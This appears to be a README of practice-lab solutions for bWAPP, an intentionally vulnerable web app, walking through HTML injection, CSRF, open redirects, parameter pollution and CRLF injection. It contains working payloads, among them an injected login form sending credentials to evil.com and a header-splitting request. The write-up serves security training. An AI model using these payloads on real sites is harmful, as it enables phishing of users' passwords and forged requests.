# bWAPP
Some bWAPP solutions :)
# A1 - Injection
Below are the html form tags that should be entered in the username.

## HTML Injection - Reflected (GET/POST)

- Security-Level : Low

    Please visit [html_1](https://github.com/divyanshu29/bWAPP/blob/master/HTML_Injection/html_1_low.html) for solution.
    
- Security-Level : Medium

   Enter below in username for HTML Injection
   ```
   %3Cform%20action%3D%22https%3A%2f%2fgoogle.com%22%3E%20%3Cinput%20type%3D%22text%22%20placeholder%3D%22Username%22%3E%3C%2fbr%3E%3C%2fbr%3E%20%3Cinput%20type%3D%22password%22%20placeholder%3D%22Password%22%3E%3C%2fbr%3E%3C%2fbr%3E%20%3Cinput%20type%3D%22submit%22%20value%3D%22Submit%22%3E%20%3C%2fform%3E
   ```
   Use [this](https://gchq.github.io/CyberChef/) site for encoding helps :)
   
- Security-Level : High

    I can't think of a way to bypass the below code protection
    ```
    function xss_check_3($data, $encoding = "UTF-8")
    {
    // htmlspecialchars - converts special characters to HTML entities    
    // '&' (ampersand) becomes '&amp;' 
    // '"' (double quote) becomes '&quot;' when ENT_NOQUOTES is not set
    // "'" (single quote) becomes '&#039;' (or &apos;) only when ENT_QUOTES is set
    // '<' (less than) becomes '&lt;'
    // '>' (greater than) becomes '&gt;'  
    return htmlspecialchars($data, ENT_QUOTES, $encoding);
    }
    ```
## HTML Injection - Reflected (URL)
 
 - Security Level : Low/High/Medium
 
    I haven't done this as it wont run on Firefox only compatible version is of IE. Niether Chromium,Chrome nor Firefox would work.Look [here](http://penthusiasts.blogspot.com/2013/12/bwapp-html-injection-all.html) for methods.
    
## HTML Injection - Stored (Blog)

- Security Level : Low
    ```
    <form action="https://evil.com">
    <input type="text" placeholder="Username"></br></br>
    <input type="password" placeholder="Password"></br></br>
    <input type="submit" value="Submit">
    </form>
    ```
- Security-Level : Medium/High

    Can't solve this one. If you know the solution please make PR.
    
# A8 - Cross Site Request Forgery(CSRF)
Below are the POC html pages. Open them in your server and click on button to perform the attack

## Cross-Site Request Forgery (Change Password)

- Security-Level : Low

    Please refer to [csrf_1](https://github.com/divyanshu29/bWAPP/blob/master/CSRF/csrf_1_low.html) for solution.
    
- Security-Level : Medium
    
    Please refer to [csrf_1](https://github.com/divyanshu29/bWAPP/blob/master/CSRF/csrf_1_medium.html) for solution.
    
- Security-Level : High
    
    Please refer to [csrf_1](https://github.com/divyanshu29/bWAPP/blob/master/CSRF/csrf_1_high.html) for solution.

## Cross-Site Request Forgery (Change Secret)

- Security-Level : Low
    
    Please refer to [csrf_2](https://github.com/divyanshu29/bWAPP/blob/master/CSRF/csrf_2_low.html) for solution.

- Security-Level : Medium

    Please refer to [csrf_2](https://github.com/divyanshu29/bWAPP/blob/master/CSRF/csrf_2_medium.html) for solution.
    
- Security-Level : High

    Please refer to [csrf_2](https://github.com/divyanshu29/bWAPP/blob/master/CSRF/csrf_2_high.html) for solution.
    
## Cross-Site Request Forgery (Transfer Amount)

- Security-Level : Low

    Please refer to [csrf_3](https://github.com/divyanshu29/bWAPP/blob/master/CSRF/csrf_3_low.html) for solution.
    
- Security-Level : Medium

    Please refer to [csrf_3](https://github.com/divyanshu29/bWAPP/blob/master/CSRF/csrf_3_medium.html) for solution.
    
- Security-Level : High

    Please refer to [csrf_3](https://github.com/divyanshu29/bWAPP/blob/master/CSRF/csrf_3_high.html) for solution.

# A-10 Unvalidated Redirects & Forwards
Below are the request that should be made for Open Redirection .

## Unvalidated Redirects & Forwards (1)

- Security-Level : Low

    Code Snippet :
    ```
    if(isset($_REQUEST["url"]) && ($_COOKIE["security_level"] != "1" && $_COOKIE["security_level"] != "2")){
    // Debugging
    // echo $_REQUEST["url"];
    
    header("Location: " . $_REQUEST["url"]);

    exit;
    }
    ```
    
    Please refer to [open_1](https://github.com/divyanshu29/bWAPP/blob/master/Open_Redirects/open_redirect_1_low) for solution.
    
- Security-Level : Medium/High

    Code Snippet:
    ```
        if($_COOKIE["security_level"] == "2")
    {
        // Destroys the session 
        $_SESSION = array();
        session_destroy();
        // Deletes the cookies
        setcookie("admin", "", time()-3600, "/", "", false, false);
        setcookie("movie_genre", "", time()-3600, "/", "", false, false);
        setcookie("secret", "", time()-3600, "/", "", false, false);
        setcookie("top_security", "", time()-3600, "/", "", false, false);
        setcookie("top_security_nossl", "", time()-3600, "/", "", false, false);
        setcookie("top_security_ssl", "", time()-3600, "/", "", false, false);
    }
    switch($_REQUEST["url"])
    {
        case "1" :
            header("Location: http://itsecgames.blogspot.com");
            break;
        case "2" :
            header("Location: http://www.linkedin.com/in/malikmesellem");
            break;
        case "3" :
            header("Location: http://twitter.com/MME_IT");
            break;
        case "4" :
            header("Location: http://www.mmeit.be/en");
            break;
        default :
            header("Location: login.php");
            break;
    }
    ```
    
    I don't think its possible to bypass this check but if you do feel free for PR.
    
## Unvalidated Redirects & Forwards (2)

- Security Level : Low

    Code Snippet:
    ```if(isset($_REQUEST["ReturnUrl"]) && ($_COOKIE["security_level"] != "1" && $_COOKIE["security_level"] != "2"))
    {
    // Debugging
    // echo $_REQUEST["url"];
    header("Location: " . $_REQUEST["ReturnUrl"]);
    exit;
    }
    ```
    
    Please refer to [open_2](https://github.com/divyanshu29/bWAPP/blob/master/Open_Redirects/open_redirect_2_low) for solution

- Security Level : Medium/High

    Code Snippet:
    ```
    if(isset($_REQUEST["ReturnUrl"]) && ($_COOKIE["security_level"] == "1" || $_COOKIE["security_level"] == "2"))
    {
    header("Location: portal.php");
    exit;
    }
    ```
    
    Not possible to bypass as per me but if you feel so feel free for PR.
    
# Other Bugs

## HTTP Parameter Pollution

- Security Level : Low/Medium
    
    Request To be Made:
    
    ```
    http://localhost/bWAPP/hpp-3.php?movie=1&name=admin&action=vote&movie=2
    ```
- Security Level : High

    I don't think its possible to bypass as such but if you think you can please go for PR.
    
    Code Snippet:
    ```
    // Detects multiple parameters with same name (HTTP Parameter Pollution)
    function hpp_check_1($data)
    {
    $query_string  = explode("&", $data);    
    $i = "";
    $param = array();
    $param_variables = array();
    foreach($query_string as $i)
    {
            $param = explode("=", $i);
            array_push($param_variables, $param[0]);
    }
    $count_unique = count(array_unique($param_variables));
    $count_total = count($param_variables);
    $hpp_detected = "";
    if($count_unique < $count_total)
    {
        $hpp_detected = "<font color=\"red\">HTTP Parameter Pollution detected!</font>";
    }
    return $hpp_detected;
    }
    ```

## HTTP Response Splitting(CRLF Injection)

- Security-Level : Low

    ```
    GET /bWAPP/http_response_splitting.php?url=http://itsecgames.blogspot.com%0d%0aLocation=https://google.com
    ```

- Security-Level : Mediumm
